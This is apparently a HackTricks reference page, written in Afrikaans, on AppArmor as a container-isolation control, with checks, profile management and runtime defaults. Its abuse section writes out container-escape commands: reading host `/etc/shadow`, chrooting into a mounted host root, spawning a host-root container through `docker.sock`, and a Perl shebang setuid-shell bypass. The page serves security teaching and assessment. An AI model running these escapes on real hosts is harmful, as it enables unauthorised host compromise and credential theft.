# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

AppArmor is a **Mandatory Access Control** stelsel wat beperkings toepas deur per-programprofiele. Anders as tradisionele DAC-kontroles, wat swaar staatmaak op gebruiker- en groep-eienaarskap, laat AppArmor die kernel 'n beleid afdwing wat aan die proses self gekoppel is. In container-omgewings maak dit saak omdat 'n workload genoeg tradisionele voorregte mag hê om 'n aksie te probeer en steeds geweier kan word omdat sy AppArmor-profiel nie die relevante path, mount, network gedrag, of gebruik van 'n capability toelaat nie.

Die belangrikste konseptuele punt is dat AppArmor **pad-gebaseerd** is. Dit redeneer oor lêerstelsel-toegang deur padreëls eerder as deur etikette soos SELinux. Dit maak dit toeganklik en kragtig, maar dit beteken ook dat bind mounts en alternatiewe pad-uitlegte noukeurige aandag verdien. As dieselfde host-inhoud onder 'n ander pad bereikbaar raak, kan die effek van die beleid nie wees wat die operateur aanvanklik verwag het nie.

## Rol in container-isolasie

Container-sekuriteitsresensies stop dikwels by capabilities en seccomp, maar AppArmor bly ná daardie kontroles steeds van belang. Stel jou 'n container voor wat meer voorreg het as wat dit behoort te hê, of 'n workload wat een ekstra capability benodig het vir operasionele redes. AppArmor kan steeds lêertoegang, mount-gedrag, networking, en uitvoeringspatrone beperk op maniere wat die voor die hand liggende misbruikpad stop. Dit is hoekom om AppArmor uit te skakel "net om die toepassing te laat werk" stilweg 'n bloot riskante konfigurasie in een kan omskep wat aktief uitgebuit kan word.

## Laboratorium

Om te kontroleer of AppArmor op die host aktief is, gebruik:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Om te sien onder watter gebruiker die huidige containerproses loop:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Die verskil is insiggewend. In die normale geval moet die proses 'n AppArmor-konteks wys wat gekoppel is aan die profiel wat deur die runtime gekies is. In die unconfined-geval verdwyn daardie ekstra beperkingslaag.

Jy kan ook inspekteer wat Docker dink dit toegepas het:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Gebruik tydens uitvoering

Docker kan 'n standaard- of aangepaste AppArmor-profiel toepas wanneer die gasheer dit ondersteun. Podman kan ook met AppArmor integreer op AppArmor-gebaseerde stelsels, alhoewel op SELinux-eerst verspreidings die ander MAC-stelsel dikwels die voorgrond neem. Kubernetes kan AppArmor-beleid op werkbelastingvlak blootstel op nodes wat werklik AppArmor ondersteun. LXC en verwante Ubuntu-familie stelselhouer-omgewings gebruik AppArmor ook wyd.

Die praktiese punt is dat AppArmor nie 'n "Docker feature" is nie. Dit is 'n gasheer-kernkenmerk wat verskeie runtimes kan kies om toe te pas. As die gasheer dit nie ondersteun nie of die runtime opdrag gekry het om unconfined te loop, is die veronderstelde beskerming nie werklik daar nie.

Op Docker-kapasiteite AppArmor-gashere is die bekendste standaard `docker-default`. Daardie profiel word gegenereer vanaf Moby se AppArmor-sjabloon en is belangrik omdat dit verduidelik waarom sommige capability-gebaseerde PoCs steeds in 'n standaard container misluk. In breë terme laat `docker-default` gewone netwerking toe, weier dit skryfaksies na groot dele van `/proc`, weier toegang tot sensitiewe dele van `/sys`, blokkeer mount-operasies, en beperk ptrace sodat dit nie 'n algemene gasheer-probing primtief is nie. Om daardie basislyn te verstaan help om te onderskei tussen "die container het `CAP_SYS_ADMIN`" en "die container kan daardie kapasiteit werklik teen die kernel-koppelvlakke gebruik wat vir my saak maak".

## Profielbestuur

AppArmor-profiele word gewoonlik gestoor onder `/etc/apparmor.d/`. 'n Algemene naamgewingkonvensie is om skuinsstrepe in die uitvoerbare pad met punte te vervang. Byvoorbeeld, 'n profiel vir `/usr/bin/man` word gewoonlik gestoor as `/etc/apparmor.d/usr.bin.man`. Hierdie detail is van belang tydens beide verdediging en assessering omdat, sodra jy die aktiewe profielnaam ken, jy dikwels die ooreenstemmende lêer vinnig op die gasheer kan opspoor.

Nuttige gasheer-kant bestuursopdragte sluit in:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Die rede waarom hierdie opdragte saak maak in 'n container-security verwysing is dat hulle verduidelik hoe profiele werklik opgebou, gelaai, na complain mode geskakel, en aangepas word nadat toepassings verander is. As 'n operateur die gewoonte het om profiele tydens probleemoplossing in complain mode te plaas en vergeet om enforcement te herstel, kan die container in dokumentasie beskerm lyk terwyl dit in werklikheid baie losser optree.

### Bou en opdateer profiele

`aa-genprof` kan toepassingsgedrag observeer en help om 'n profiel interaktief te genereer:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kan 'n sjabloonprofiel genereer wat later met `apparmor_parser` gelaai kan word:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wanneer die binary verander en die beleid opgedateer moet word, kan `aa-logprof` weierings wat in logs gevind word herafspel en die operateur help om te besluit of dit toegelaat of geweier moet word:
```bash
sudo aa-logprof
```
### Logs

AppArmor-afwysings is dikwels sigbaar deur `auditd`, syslog, of gereedskap soos `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Dit is nuttig, sowel operasioneel as offensief. Verdedigers gebruik dit om profiele te verfyn. Aanvallers gebruik dit om te bepaal watter presiese pad of operasie geweier word en of AppArmor die beheer is wat 'n exploit chain blokkeer.

### Identifiseer die presiese profiellêer

Wanneer 'n runtime 'n spesifieke AppArmor-profielnaam vir 'n container vertoon, is dit dikwels nuttig om daardie naam terug te spoor na die profiellêer op die skyf:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Dit is veral nuttig tydens host-side hersiening omdat dit die gaping oorbrug tussen "the container sê dit loop onder profile `lowpriv`" en "die werklike reëls lê in hierdie spesifieke lêer wat geoudit of herlaai kan word".

## Misconfigurations

Die mees voor die hand liggende fout is `apparmor=unconfined`. Administrateurs stel dit dikwels terwyl hulle 'n toepassing debug wat misluk het omdat die profiel korrek iets gevaarliks of onverwagts geblokkeer het. As die vlag in produksie bly, is die hele MAC-laag effektief verwyder.

Nog 'n fyn probleem is om aan te neem dat bind mounts onskadelik is omdat die lêertoestemmings normaal lyk. Aangesien AppArmor pad-gebaseerd is, kan die blootstelling van host-paaie onder alternatiewe mount-liggings sleg saamwerk met padreëls. 'n Derde fout is om te vergeet dat 'n profielnaam in 'n konfigurasielêer baie min beteken as die host kernel nie eintlik AppArmor afdwing nie.

## Abuse

As AppArmor weg is, kan operasies wat voorheen beperk was skielik werk: om sensitiewe paaie deur bind mounts te lees, dele van procfs of sysfs te bereik wat moeilik toeganklik moes bly, mount-verwante aksies uit te voer as capabilities/seccomp dit ook toelaat, of paaie te gebruik wat 'n profiel normaalweg sou weier. AppArmor is dikwels die meganisme wat verklaar waarom 'n capability-based breakout-poging op papier 'behoort te werk' maar in die praktyk steeds misluk. Verwyder AppArmor, en dieselfde poging kan begin slaag.

Indien jy vermoed AppArmor is die hoof ding wat 'n path-traversal, bind-mount, of mount-based misbruikketting stop, is die eerste stap gewoonlik om te vergelyk wat toeganklik raak met en sonder 'n profiel. Byvoorbeeld, as 'n host path binne die container gemount is, begin deur te kontroleer of jy dit kan deurloop en lees:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
As die container ook 'n gevaarlike capability soos `CAP_SYS_ADMIN` het, is een van die mees praktiese toetse om te kyk of AppArmor die komponent is wat mount operations of toegang tot sensitiewe kernel filesystems blokkeer:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In omgewings waar 'n host path reeds via 'n bind mount beskikbaar is, kan die verlies van AppArmor ook 'n read-only information-disclosure-kwessie omskep in direkte toegang tot host-lêers:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Die punt van hierdie opdragte is nie dat AppArmor op sigself die uitbraak veroorsaak nie. Sodra AppArmor verwyder is, raak baie lêerstelsel- en mount-gebaseerde misbruikpade onmiddellik toetsbaar.

### Volledige voorbeeld: AppArmor gedeaktiveer + host-root aangemon­teer

As die container reeds die host root by `/host` bind-gemount het, kan die verwydering van AppArmor 'n geblokkeerde lêerstelsel-misbruikpad in 'n volledige host-ontsnapping omskep:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sodra die shell via die host filesystem uitgevoer word, het die workload effektief die container boundary ontsnap:
```bash
id
hostname
cat /etc/shadow | head
```
### Volledige Voorbeeld: AppArmor Gedeaktiveer + Runtime Socket

As die werklike hindernis AppArmor rondom die runtime-toestand was, kan 'n gemonteerde socket genoeg wees vir 'n volledige ontsnapping:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Die presiese pad hang af van die mount point, maar die eindresultaat is dieselfde: AppArmor voorkom nie meer toegang tot die runtime API nie, en die runtime API kan 'n host-kompromitterende container lanseer.

### Volledige voorbeeld: Path-Based Bind-Mount Bypass

Omdat AppArmor path-based is, beskerm die beskerming van `/proc/**` nie outomaties dieselfde host procfs-inhoud wanneer dit via 'n ander pad bereikbaar is nie:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Die impak hang af van wat presies mounted is en of die alternatiewe pad ook ander beheermaatreëls omseil, maar hierdie patroon is een van die duidelikste redes waarom AppArmor saam met mount layout en nie geïsoleerd nie geëvalueer moet word.

### Volledige Voorbeeld: Shebang Bypass

AppArmor-beleid mik soms op 'n interpreter path op 'n manier wat nie volledig rekening hou met script-uitvoering deur shebang handling nie. 'n Historiese voorbeeld het behels die gebruik van 'n script waarvan die eerste lyn na 'n confined interpreter wys:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Hierdie soort voorbeeld is belangrik as 'n herinnering dat die bedoeling van 'n profile en die werklike uitvoeringssemantiek kan uiteenloop. Wanneer AppArmor in container-omgewings hersien word, verdien tolk-kettings en alternatiewe uitvoeringspaaie besondere aandag.

## Kontroles

Die doel van hierdie kontroles is om vinnig drie vrae te beantwoord: is AppArmor op die gasheer geaktiveer, is die huidige proses beperk, en het die runtime werklik 'n profile op hierdie container toegepas?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Wat hier interessant is:

- As `/proc/self/attr/current` `unconfined` wys, trek die workload nie voordeel uit AppArmor-beperking nie.
- As `aa-status` AppArmor gedeaktiveer of nie gelaai wys, is enige profielnaam in die runtime-konfigurasie hoofsaaklik kosmeties.
- As `docker inspect` `unconfined` of 'n onverwagte custom profile wys, is dit dikwels die rede dat 'n filesystem- of mount-based abuse path werk.

As 'n container reeds verhoogde voorregte vir operasionele redes het, maak dit dikwels die verskil om AppArmor aangeskakel te laat tussen 'n beheerbare uitsondering en 'n veel wyer sekuriteitsmislukking.

## Standaardinstellings vir runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Standaard geaktiveer op gasheer met AppArmor-ondersteuning | Gebruik die `docker-default` AppArmor-profiel tensy dit oorskryf word | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Gasheer-afhanklik | AppArmor word ondersteun via `--security-opt`, maar die presiese standaard is gasheer-/runtime-afhanklik en minder universeel as Docker se gedokumenteerde `docker-default` profiel | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Voorwaardelike standaard | As `appArmorProfile.type` nie gespesifiseer is nie, is die standaard `RuntimeDefault`, maar dit word slegs toegepas wanneer AppArmor op die node geaktiveer is | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` met 'n swak profiel, nodes sonder AppArmor-ondersteuning |
| containerd / CRI-O under Kubernetes | Volg node/runtime-ondersteuning | Algemene Kubernetes-ondersteunde runtimes ondersteun AppArmor, maar werklike afdwinging hang steeds af van node-ondersteuning en workload-instellings | Soos die Kubernetes-ry; direkte runtime-konfigurasie kan ook AppArmor heeltemal oorslaan |

Vir AppArmor is die belangrikste veranderlike dikwels die **host**, nie net die runtime nie. 'n Profielinstelling in 'n manifest skep nie inperking op 'n node waar AppArmor nie geaktiveer is nie.
{{#include ../../../../banners/hacktricks-training.md}}
